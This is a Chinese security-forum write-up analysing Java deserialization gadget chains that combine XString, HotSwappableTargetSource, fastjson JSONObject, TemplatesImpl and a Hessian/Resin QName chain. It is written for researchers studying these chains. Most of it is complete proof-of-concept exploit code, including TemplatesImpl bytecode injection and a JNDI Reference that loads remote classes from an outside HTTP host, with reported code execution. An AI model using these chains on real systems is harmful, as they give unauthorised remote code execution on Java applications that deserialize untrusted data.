# HotSwappableTargetSource+XString利用分析-先知社区

> **来源**: https://xz.aliyun.com/news/17990  
> **文章ID**: 17990

---

# HotSwappableTargetSource+XString利用分析

前言：为什么 XString 需要配合 HotSwappableTargetSource 进行利用而不能直接单独使用由 equals 调用到 tostring 方法。

## XString 构造

这里先尝试只用 XString 来进行构造看能不能调用到 tostring 方法，拿调用 `JsonObject#toString` 来实验，那么链子如下，

```
HashMap#readObject->HashMap#putVal->XString#equals->JsonObject#toString->
```

先照着 HotSwappableTargetSource 的格式写个 poc

```
package org.example;  
  
import com.alibaba.fastjson.JSONObject;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import com.sun.org.apache.xpath.internal.objects.XString;  
import org.springframework.aop.target.HotSwappableTargetSource;  
  
import java.io.*;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.Base64;  
import java.util.HashMap;  
  
public class xstringtest {  
    public static void main(String[] args) throws Exception {  
        Object templatesimpl = null;  
        JSONObject jsonObject = new JSONObject();  
        jsonObject.put("g","m");  
        JSONObject jsonObject1 = new JSONObject();  
        jsonObject1.put("g",templatesimpl);  
  
  
//        HotSwappableTargetSource v1 = new HotSwappableTargetSource(jsonObject);  
//        HotSwappableTargetSource v2 = new HotSwappableTargetSource(new XString("x"));  
        XString xs= new XString("x");  
  
        HashMap<Object,Object> hashMap = new HashMap<>();  
        hashMap.put(jsonObject ,jsonObject);  
        hashMap.put(xs,xs);  
  
        serialize(hashMap);  
        unserialize("ser.bin");  
    }  
  
    public static void setValue(Object obj,String field,Object value) throws Exception{  
        Field f = obj.getClass().getDeclaredField(field);  
        f.setAccessible(true);  
        f.set(obj,value);  
    }  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
        oos.close();  
  
    }  
    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
        Object obj = ois.readObject();  
        return obj;  
    }  
}
```

看上面 gadget，其实最主要的部分还是 `HashMap#putVal- >XString#equals` 这段调用，进入 `HashMap#putVal` 方法看到要想调用到 key.equals 需要不满足一个 if 条件，

![](images/20250513201908-788cdf7c-2ff4-1.png)

需要想 hashmap 中添加两个键值对，然后注意到 `tab[i = (n - 1) & hash]`，会判断这个 `tab[i]` 是不是空，不是就会调用 equals 方法。

所以我们需要让两次的 `tab[i]` 的 i 值一样，这样第二次判断时不为 null 就会调用我们需要的 equals 方法（k 参数就是上一次的 key），而这个 i 值看到主要是由 hash 决定，n 值都一样。

朔源 hash 值，看到是根据 hash(key) 得来的，

![](images/20250513201910-79804851-2ff4-1.png)

这里的两次 hashmap 键值对为下面，不难想象如果 `tab[i]` 不为空后最后会调用 `xs.equals(jsonObject)`，

```
hashMap.put(jsonObject ,jsonObject);  
hashMap.put(xs,xs);  
```

这里 XString 的 hash 值计算还有个特点，会把其参数强制转换为 string 类型来进行 hash 计算，上面是 `XString("x")` 所以最后会计算 `hash(x)`，现在最主要的是怎么让其 hash 值相等，这里就可以用到下面这个 hash 爆破脚本

```
package org.example;  
  
import static java.util.Objects.hash;  
  
public class HashCollision {  
    public static String convert(String str) {  
        str = (str == null ? "" : str);  
        String tmp;  
        StringBuffer sb = new StringBuffer(1000);  
        char c;  
        int i, j;  
        sb.setLength(0);  
        for (i = 0; i < str.length(); i++) {  
            c = str.charAt(i);  
            sb.append("\u");  
            j = (c >>> 8); // 取出高8位  
            tmp = Integer.toHexString(j);  
            if (tmp.length() == 1)  
                sb.append("0");  
            sb.append(tmp);  
            j = (c & 0xFF); // 取出低8位  
            tmp = Integer.toHexString(j);  
            if (tmp.length() == 1)  
                sb.append("0");  
            sb.append(tmp);  
        }  
        return (new String(sb));  
    }  
    public static String string2Unicode(String string) {  
        StringBuffer unicode = new StringBuffer();  
        for (int i = 0; i < string.length(); i++) {  
            // 取出每一个字符  
            char c = string.charAt(i);  
            // 转换为unicode  
            unicode.append("\u" + Integer.toHexString(c));  
        }  
        return unicode.toString();  
    }  
    /**  
     * Returns a string with a hash equal to the argument.     *     * @return string with a hash equal to the argument.  
     * @author - Joseph Darcy  
     */    public static String unhash(int target) {  
        StringBuilder answer = new StringBuilder();  
        if (target < 0) {  
            // String with hash of Integer.MIN_VALUE, 0x80000000  
            answer.append("\u0915\u0009\u001e\u000c\u0002");  
            if (target == Integer.MIN_VALUE)  
                return answer.toString();  
            // Find target without sign bit set  
            target = target & Integer.MAX_VALUE;  
        }  
        unhash0(answer, target);  
        return answer.toString();  
    }  
    /**  
     *     * @author - Joseph Darcy  
     */    private static void unhash0(StringBuilder partial, int target) {  
        int div = target / 31;  
        int rem = target % 31;  
        if (div <= Character.MAX_VALUE) {  
            if (div != 0)  
                partial.append((char) div);  
            partial.append((char) rem);  
        } else {  
            unhash0(partial, div);  
            partial.append((char) rem);  
        }  
    }  
    public static void main(String[] args) {  
        System.out.println(convert(unhash(1681595766)));  
        System.out.println("\ucae6\u0015\u0019\u0001".hashCode());  
    }  
}
```

这个脚本是计算 key.hashcode()，调试看到 `jsonObject.hashcode()` 的值为 10

![](images/20250513201911-7a1645c2-2ff4-1.png)

爆破的的值为 `/n`，那么构造

```
XString xs= new XString("
");
```

看到满足条件

![](images/20250513201912-7ab6d7c6-2ff4-1.png)

继续跟进，最后成功来到 equals 方法

![](images/20250513201913-7b5c7de0-2ff4-1.png)

然后调用到了 JSONObject.toString 方法

![](images/20250513201914-7c0ebd10-2ff4-1.png)

不过这里再看看上面 payload 发现

```
JSONObject jsonObject = new JSONObject();  
jsonObject.put("g","m");  
```

要想最后调用 `TemplatesImpl#getOutputProperties` 方法还需要这样构造

```
TemplatesImpl tem =new TemplatesImpl();  
byte[] code = Files.readAllBytes(Paths.get("D:/gaoren.class"));  
setValue(tem, "_bytecodes", new byte[][]{code});  
setValue(tem, "_tfactory", new TransformerFactoryImpl());  
setValue(tem, "_name", "gaoren");  
setValue(tem, "_class", null);  
  
JSONObject jsonObject = new JSONObject();  
jsonObject.put("g",tem);  
```

然后再次重新爆破 hash 值，但是如果 jsonObject 中的 map 的 key 是 TemplatesImpl 对象的话其实有个问题，看看 `hash(JSONObject)`，

![](images/20250513201915-7c89d51f-2ff4-1.png)

跟进 `key.hashcode()`，

![](images/20250513201916-7cff3cf6-2ff4-1.png)

主要看看这里的 this.map

![](images/20250513201917-7d8d8a9d-2ff4-1.png)

这里因为TemplatesImpl 没有 hashcode 方法，会调用到 Object.hashCode()，而这个在每次实例化的时候都不一样，所以通过new实例化的TemplatesImpl和readObject实例化的TemplatesImpl是两个不同的对象，这就导致每次报错得到的 hash 和最后反序列化触发的时候始终不一样。

不过经过上面一通分析发现只是调用 tostring 方法单靠 XString 还是能做到得，那么只有最后的对象存在 hashcode 方法就行了。

## HotSwappableTargetSource 妙用

接下来分析 HotSwappableTargetSource 怎么解决的最后利用问题，poc

```
package org.example;  
  
import com.alibaba.fastjson.JSONObject;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import com.sun.org.apache.xpath.internal.objects.XString;  
import org.springframework.aop.target.HotSwappableTargetSource;  
  
import java.io.*;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.Base64;  
import java.util.HashMap;  
  
public class xstringtest {  
    public static void main(String[] args) throws Exception {  
        TemplatesImpl tem =new TemplatesImpl();  
        byte[] code = Files.readAllBytes(Paths.get("D:/gaoren.class"));  
        setValue(tem, "_bytecodes", new byte[][]{code});  
        setValue(tem, "_tfactory", new TransformerFactoryImpl());  
        setValue(tem, "_name", "gaoren");  
        setValue(tem, "_class", null);  
  
        JSONObject jsonObject = new JSONObject();  
        jsonObject.put("g","m");  
        JSONObject jsonObject1 = new JSONObject();  //后面利用反射设置属性，防止提前调用
        jsonObject1.put("g",tem);  
  
  
        HotSwappableTargetSource v1 = new HotSwappableTargetSource(jsonObject);  
        HotSwappableTargetSource v2 = new HotSwappableTargetSource(new XString("x"));  
//        XString xs1= new XString(jsonObject.toJSONString());  
//        XString xs= new XString("
");  
  
        HashMap<Object,Object> hashMap = new HashMap<>();  
        hashMap.put(v1 ,v1);  
        hashMap.put(v2,v2);  
  
        setValue(v1,"target",jsonObject1);  
  
//      用于Reference包裹绕过FastJSon高版本resolveClass黑名单检查,from Y4tacker  
/*        HashMap<Object,Object> hhhhashMap = new HashMap<>();  
        hhhhashMap.put(tpl,hashMap);*/  
        serialize(hashMap);  
        unserialize("ser.bin");  
    }  
  
    public static void setValue(Object obj,String field,Object value) throws Exception{  
        Field f = obj.getClass().getDeclaredField(field);  
        f.setAccessible(true);  
        f.set(obj,value);  
    }  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
        oos.close();  
  
    }  
    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
        Object obj = ois.readObject();  
        return obj;  
    }  
}
```

同样到 hash 函数

![](images/20250513201918-7e2c17bd-2ff4-1.png)

因为这里的 `HotSwappableTargetSource` 类存在 hashcode 方法，直接调用其 hashcode 方法，

![](images/20250513201919-7ed22870-2ff4-1.png)

所以两个键的 hash 值也就相等了，都是 `HotSwappableTargetSource` 类，接下来就会调用到 `HotSwappableTargetSource.equals` 方法，参数也是 `HotSwappableTargetSource` 对象

![](images/20250513201920-7f90e10e-2ff4-1.png)

继续跟进看到接下来会调用 `HotSwappableTargetSource` 对象的 target 的 equals 方法

![](images/20250513201921-801eb7b1-2ff4-1.png)

两个 target 看上面就行了，所以最好调用到 `XString.equals` 方法，并且 JSONObject 中的 map 也是可以利用的 TemplatesImpl

![](images/20250513201922-809cb2e7-2ff4-1.png)

## 其他 Xstring 组合

比如说在 resin 反序列化中的 QName 利用链，就是通过 tostring 触发到远程类加载，看了师傅们的链子是通过 hessian 反序列化触发 hshamap.put，然后通过 Xstring 来实现的调用，

poc

```
import com.caucho.hessian.io.Hessian2Input;  
import com.caucho.hessian.io.Hessian2Output;  
import com.caucho.naming.QName;  
import com.sun.org.apache.xpath.internal.objects.XString;  
import sun.reflect.ReflectionFactory;  
import javax.naming.CannotProceedException;  
import javax.naming.Reference;  
import javax.naming.directory.DirContext;  
import java.io.ByteArrayInputStream;  
import java.io.ByteArrayOutputStream;  
import java.io.IOException;  
import java.io.ObjectOutputStream;  
import java.lang.reflect.Array;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.lang.reflect.InvocationTargetException;  
import java.util.Base64;  
import java.util.HashMap;  
import java.util.Hashtable;  
  
public class hessian_resin {  
    public static void main(String[] args) throws Exception {  
        Reference refObj=new Reference("LDAP_POC","LDAP_POC","http://47.109.156.81:6666/");  
        Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NLS-1$  
        Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);  
        ccCons.setAccessible(true);  
        CannotProceedException cpe = new CannotProceedException();  
  
        cpe.setResolvedObj(refObj);  
        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());  
        QName qName = new QName(ctx, "boo", "gii");  
        String unhash = unhash(qName.hashCode());  
        XString xString = new XString(unhash);  
        HashMap<Object, Object> map = makeMap(qName, xString);  
        ByteArrayOutputStream baos = new ByteArrayOutputStream();  
        Hessian2Output out = new Hessian2Output(baos);  
        out.getSerializerFactory().setAllowNonSerializable(true);  
        out.writeObject(map);  
        out.flushBuffer();  
  
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());  
        Hessian2Input input = new Hessian2Input(bais);  
        input.readObject();  
        //String ret = Base64.getEncoder().encodeToString(baos.toByteArray());  
        //System.out.println(ret);  
    }  
    public static HashMap<Object, Object> makeMap ( Object v1, Object v2 ) throws Exception {  
        HashMap<Object, Object> s = new HashMap<>();  
        setFieldValue(s, "size", 2);  
        Class<?> nodeC;  
        try {  
            nodeC = Class.forName("java.util.HashMap$Node");  
        }  
        catch ( ClassNotFoundException e ) {  
            nodeC = Class.forName("java.util.HashMap$Entry");  
        }  
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);  
        nodeCons.setAccessible(true);  
  
        Object tbl = Array.newInstance(nodeC, 2);  
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));  
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));  
        setFieldValue(s, "table", tbl);  
        return s;  
    }  
    public static <T> T createWithoutConstructor(Class<T> classToInstantiate) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {  
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);  
    }  
    public static String serial(Object o) throws IOException, NoSuchFieldException {  
        ByteArrayOutputStream baos = new ByteArrayOutputStream();  
        ObjectOutputStream oos = new ObjectOutputStream(baos);  
        //Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField("writeReplaceMethod");  
        //writeReplaceMethod.setAccessible(true);        oos.writeObject(o);  
        oos.close();  
  
        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());  
        return base64String;  
  
    }  
  
    public static <T> T createWithConstructor(Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {  
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);  
        objCons.setAccessible(true);  
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);  
        sc.setAccessible(true);  
        return (T) sc.newInstance(consArgs);  
    }  
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {  
        Field field = obj.getClass().getDeclaredField(fieldName);  
        field.setAccessible(true);  
        field.set(obj, value);  
    }  
    public static String unhash ( int hash ) {  
        int target = hash;  
        StringBuilder answer = new StringBuilder();  
        if ( target < 0 ) {  
            // String with hash of Integer.MIN_VALUE, 0x80000000  
            answer.append("\u0915\u0009\u001e\u000c\u0002");  
  
            if ( target == Integer.MIN_VALUE )  
                return answer.toString();  
            // Find target without sign bit set  
            target = target & Integer.MAX_VALUE;  
        }  
  
        unhash0(answer, target);  
        return answer.toString();  
    }  
    private static void unhash0 ( StringBuilder partial, int target ) {  
        int div = target / 31;  
        int rem = target % 31;  
  
        if ( div <= Character.MAX_VALUE ) {  
            if ( div != 0 )  
                partial.append((char) div);  
            partial.append((char) rem);  
        }  
        else {  
            unhash0(partial, div);  
            partial.append((char) rem);  
        }  
    }  
}
```

执行成功弹出计算机

![](images/20250513201923-8140aef4-2ff4-1.png)

为什么这里只用 XString 依赖就能成功调用到 toString 方法呢？其实很简单，上面说了是因为这里的 QName 是存在 hsahcode 方法的使得其每次对象的 hash 值是一样的，这样本地爆破出的来的 hash 值和反序列化时就是一样的，

看其 hashcode 方法

![](images/20250513201924-81dd5243-2ff4-1.png)

看到获得是一个字符串，也就是上面构造函数传入的两个字符串，所以 hash 值完全可控不会变，这样就可以直接由 Xstring 调用到 toString 方法了。

![](images/20250513201925-8261e81f-2ff4-1.png)

当然这只是一个例子，其他的还有很多。

## 参考

[https://boogipop.com/2023/05/18/Resin&&XBean反序列化利用链学习/#toString-Qname](https://boogipop.com/2023/05/18/Resin&&XBean%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/#toString-Qname)

后面发现早有师傅分析过这个问题了。

<https://mp.weixin.qq.com/s/cqntHdPy0b-W0ozNilVMsQ>
